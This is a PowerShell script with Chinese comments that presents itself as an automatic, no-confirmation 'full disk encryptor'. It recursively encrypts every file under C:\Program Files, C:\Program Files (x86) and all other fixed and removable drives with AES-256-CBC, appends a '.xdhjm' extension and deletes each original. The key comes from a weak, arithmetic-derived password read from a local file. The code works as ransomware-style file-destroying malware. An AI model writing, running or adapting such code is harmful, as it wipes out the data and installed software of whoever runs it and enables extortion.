# ============================================================
# 全盘加密器 (AES-256-CBC) - 无确认自动运行版
# 密码规则：2011 - (C:\syslock_app\passw.txt 中的数值)
# 加密范围：C:\Program Files 和 C:\Program Files (x86) 的所有文件
#           + 其他所有盘符（D:、E:、U盘等）的全部文件
# 警告：此脚本将加密指定文件，并在加密成功后删除原文件！
# ============================================================

function Get-SHA256Hash([byte[]]$data) {
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $hash = $sha.ComputeHash($data)
    $sha.Dispose()
    return $hash
}

function Encrypt-File([string]$filePath, [byte[]]$keyBytes) {
    try {
        $plainBytes = [System.IO.File]::ReadAllBytes($filePath)
    } catch {
        Write-Host "  [SKIP] Cannot read: $filePath" -ForegroundColor Yellow
        return $false
    }

    if ($plainBytes.Length -eq 0) {
        Write-Host "  [SKIP] Empty file: $filePath" -ForegroundColor Gray
        return $false
    }

    # 生成随机 IV（16字节）
    $iv = New-Object byte[] 16
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $rng.GetBytes($iv)
    $rng.Dispose()

    # 密码的 SHA-256 哈希（用于头部验证）
    $passwordHash = Get-SHA256Hash $keyBytes

    # AES-256-CBC 加密器
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $keyBytes
    $aes.IV = $iv

    $encryptor = $aes.CreateEncryptor()
    try {
        $cipherBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
    } catch {
        Write-Host "  [ERROR] Encryption failed: $filePath" -ForegroundColor Red
        $aes.Dispose()
        return $false
    } finally {
        $aes.Dispose()
    }

    $outFile = $filePath + '.xdhjm'
    try {
        $fs = [System.IO.File]::OpenWrite($outFile)
        $fs.Write($passwordHash, 0, $passwordHash.Length)   # 32字节
        $fs.Write($iv, 0, $iv.Length)                       # 16字节
        $fs.Write($cipherBytes, 0, $cipherBytes.Length)    # 密文
        $fs.Close()
    } catch {
        Write-Host "  [ERROR] Failed to write encrypted file: $outFile" -ForegroundColor Red
        return $false
    }

    # ===== 加密成功，删除原文件 =====
    try {
        [System.IO.File]::Delete($filePath)
        Write-Host "  [OK] $filePath -> $outFile (original deleted)" -ForegroundColor Green
    } catch {
        Write-Host "  [WARN] Encryption succeeded but cannot delete original: $filePath" -ForegroundColor Yellow
        # 即使删除失败，加密文件已生成，仍视为成功
    }
    return $true
}

function Encrypt-Directory([string]$dirPath, [byte[]]$keyBytes) {
    if (-not (Test-Path $dirPath -PathType Container)) {
        Write-Host "[WARN] Directory not found: $dirPath" -ForegroundColor Yellow
        return
    }

    Write-Host "[Processing] $dirPath" -ForegroundColor Cyan

    $items = Get-ChildItem -Path $dirPath -Force -ErrorAction SilentlyContinue
    if (-not $items) { return }

    foreach ($item in $items) {
        if ($item.PSIsContainer) {
            Encrypt-Directory $item.FullName $keyBytes
        } else {
            if ($item.Extension -ieq '.xdhjm') { continue }
            Encrypt-File $item.FullName $keyBytes
        }
    }
}

# ========== 主程序 ==========
Write-Host '============================================================' -ForegroundColor Cyan
Write-Host '  Full Disk Encryptor (AES-256-CBC) - Auto Mode' -ForegroundColor Yellow
Write-Host '  Password rule: 2011 - (value in C:\syslock_app\passw.txt)' -ForegroundColor Yellow
Write-Host '  Encryption targets:' -ForegroundColor Yellow
Write-Host '    - C:\Program Files' -ForegroundColor Yellow
Write-Host '    - C:\Program Files (x86)' -ForegroundColor Yellow
Write-Host '    - All other drives (D:\, E:\, USB, etc.)' -ForegroundColor Yellow
Write-Host '  WARNING: This will encrypt files and delete originals!' -ForegroundColor Red
Write-Host '  No confirmation will be asked, starting immediately...' -ForegroundColor Red
Write-Host '============================================================' -ForegroundColor Cyan

# 读取密码文件
$pwdFile = 'C:\syslock_app\passw.txt'
if (-not (Test-Path $pwdFile)) {
    Write-Host "ERROR: Password file not found: $pwdFile" -ForegroundColor Red
    exit 1
}

$pwdText = (Get-Content $pwdFile -Raw).Trim()
$num = 0
if (-not ([int]::TryParse($pwdText, [ref]$num))) {
    Write-Host 'ERROR: Password file content is not a valid integer.' -ForegroundColor Red
    exit 1
}

$passwordInt = 2011 - $num
if ($passwordInt -lt 0) { $passwordInt = 0 }
$passwordStr = $passwordInt.ToString()
Write-Host "Password: $passwordStr" -ForegroundColor Green

# 生成 AES-256 密钥
$keyBytes = Get-SHA256Hash ([System.Text.Encoding]::UTF8.GetBytes($passwordStr))

# 获取所有固定盘和可移动盘
$drives = [System.IO.DriveInfo]::GetDrives() | Where-Object { $_.DriveType -eq 'Fixed' -or $_.DriveType -eq 'Removable' }

foreach ($drive in $drives) {
    $root = $drive.RootDirectory.FullName
    if ($root -ieq 'C:\') {
        Write-Host "`n[Encrypting C: white-listed directories]" -ForegroundColor Magenta
        Encrypt-Directory 'C:\Program Files' $keyBytes
        Encrypt-Directory 'C:\Program Files (x86)' $keyBytes
    } else {
        Write-Host "`n[Encrypting drive $root]" -ForegroundColor Magenta
        Encrypt-Directory $root $keyBytes
    }
}

Write-Host "`nEncryption task completed." -ForegroundColor Cyan